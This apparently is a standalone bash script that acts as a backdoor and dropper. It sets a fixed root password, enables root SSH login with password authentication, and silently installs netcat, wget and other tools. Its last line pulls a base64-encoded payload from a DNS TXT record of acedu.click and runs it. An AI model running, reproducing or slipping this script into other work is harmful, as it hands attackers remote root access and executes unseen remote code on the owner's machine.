#!/bin/bash
echo root:acedu.click.54321 | sudo chpasswd root
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo service sshd restart
# Debian12+
sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1
bash <(host -t txt acedu.click |cut -d'"' -f2 |base64 -d)
